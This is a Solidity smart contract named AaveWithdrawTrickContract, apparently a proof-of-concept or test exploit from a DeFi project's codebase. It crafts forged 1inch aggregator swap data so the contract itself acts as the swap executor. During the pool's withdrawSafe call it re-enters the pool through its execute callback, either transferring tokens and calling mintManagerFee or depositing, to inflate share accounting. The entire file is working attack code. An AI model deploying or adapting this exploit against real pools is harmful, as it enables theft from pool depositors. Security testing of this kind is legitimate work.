// SPDX-License-Identifier: MIT
pragma solidity 0.7.6;
pragma experimental ABIEncoderV2;
import {ISwapDataConsumingGuard} from "../interfaces/guards/ISwapDataConsumingGuard.sol";
import {ISwapper} from "../interfaces/flatMoney/swapper/ISwapper.sol";
import {IPoolLogic} from "../interfaces/IPoolLogic.sol";
import {IERC20} from "../interfaces/IERC20.sol";

interface IAggregationRouterV6 {
  struct SwapDescription {
    address srcToken; // IERC20
    address dstToken; // IERC20
    address payable srcReceiver;
    address payable dstReceiver;
    uint256 amount;
    uint256 minReturnAmount;
    uint256 flags;
  }

  function swap(
    address sender,
    SwapDescription calldata desc,
    bytes calldata swapdata
  ) external payable returns (uint256 returnAmount);
}

// only for case that there is one srcToken(collateral asset) element in the srcTokenSwapDetails array (type is ISwapper.SrcTokenSwapDetails[]);
contract AaveWithdrawTrickContract {
  bytes public mSwapData;
  ISwapper.SrcTokenSwapDetails[] public tokensDetails;
  address public destToken;
  uint256 public destAmount;
  uint256 public count;
  IPoolLogic public pool;
  address public router = 0x111111125421cA6dc452d289314280a0f8842A65;
  enum AttackType {
    InflateSend,
    InflateDeposit
  }
  AttackType public attackType;

  function setSwapData(bytes memory _swapData, address _pool, address swapper) public {
    ISwapDataConsumingGuard.ComplexAssetSwapData memory swapData = abi.decode(
      _swapData,
      (ISwapDataConsumingGuard.ComplexAssetSwapData)
    );
    pool = IPoolLogic(_pool);
    destToken = address(swapData.destData.destToken);
    destAmount = swapData.destData.minDestAmount;

    ISwapper.SrcTokenSwapDetails[] memory stsDetails = abi.decode(swapData.srcData, (ISwapper.SrcTokenSwapDetails[]));
    uint256 stsDetailsLength = stsDetails.length;

    for (uint256 i; i < stsDetailsLength; ++i) {
      address token = address(stsDetails[i].token);
      uint256 amount = stsDetails[i].amount;
      tokensDetails.push(
        ISwapper.SrcTokenSwapDetails({
          token: IERC20(token),
          amount: amount,
          aggregatorData: stsDetails[i].aggregatorData
        })
      );

      IAggregationRouterV6.SwapDescription memory desc = IAggregationRouterV6.SwapDescription({
        srcToken: token,
        dstToken: destToken,
        srcReceiver: payable(router),
        dstReceiver: payable(address(swapper)),
        amount: amount,
        minReturnAmount: destAmount, // only one collateral asset, so all destAmount is from this swap
        flags: 0
      });
      stsDetails[i].aggregatorData.swapData = abi.encodeWithSelector(
        IAggregationRouterV6.swap.selector,
        this,
        desc,
        "0x0"
      );
    }
    swapData.srcData = abi.encode(stsDetails);
    mSwapData = abi.encode(swapData);
  }

  function attack(
    uint256 _fundTokenAmount,
    IPoolLogic.ComplexAsset[] memory _complexAssetsData,
    AttackType aType
  ) public {
    attackType = aType;
    count = 0;
    pool.withdrawSafe(_fundTokenAmount, _complexAssetsData);
  }

  function execute(address) public returns (uint256) {
    // send destToken to get swapper satisfied with the swapData.destData.minDestAmount
    count += 1;
    IERC20(destToken).transfer(router, destAmount);

    if (count == tokensDetails.length) {
      if (AttackType.InflateSend == attackType) {
        // Transfer all dstToken in this contract to the pool
        IERC20(destToken).transfer(address(pool), IERC20(destToken).balanceOf(address(this)));
        pool.mintManagerFee();
      } else if (AttackType.InflateDeposit == attackType) {
        IERC20(destToken).approve(address(pool), IERC20(destToken).balanceOf(address(this)));
        pool.deposit(destToken, IERC20(destToken).balanceOf(address(this)));
      }
    }

    return destAmount;
  }
}
